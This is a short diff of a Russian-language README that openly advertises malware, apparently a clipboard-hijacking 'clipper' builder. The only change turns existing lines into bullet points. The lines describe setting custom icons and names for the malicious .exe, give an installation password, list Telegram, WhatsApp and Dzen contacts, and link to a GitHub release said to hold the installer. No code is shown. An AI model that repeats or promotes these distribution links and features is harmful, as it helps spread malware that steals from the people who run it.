@@ -21,12 +21,12 @@
 - позволяет устанавливать пользовательские значки для вредоносного ПО .exe
 - позволяет задать пользовательское имя для вредоносного ПО .exe
 - документация встроена в графический интерфейс на вкладке "документация"
-**пароль на установку @fradyrad**
-если у Вас есть вопросы пишем 
-[Telegram](https://t.me/fradyrad)
-[whatsapp](https://wa.me/79511193576)
-[Яндекс дзен](https://dzen.ru/privatsoft)
-[Установщик программы](https://github.com/jamping1/raccoon_clipper_2025/releases/tag/setup) 
+- **пароль на установку @fradyrad**
+- если у Вас есть вопросы пишем 
+- [Telegram](https://t.me/fradyrad)
+- [whatsapp](https://wa.me/79511193576)
+- [Яндекс дзен](https://dzen.ru/privatsoft)
+- [Установщик программы](https://github.com/jamping1/raccoon_clipper_2025/releases/tag/setup) 
 - Пароль на установку @fradyrad
 
 ** функции вредоносного по **
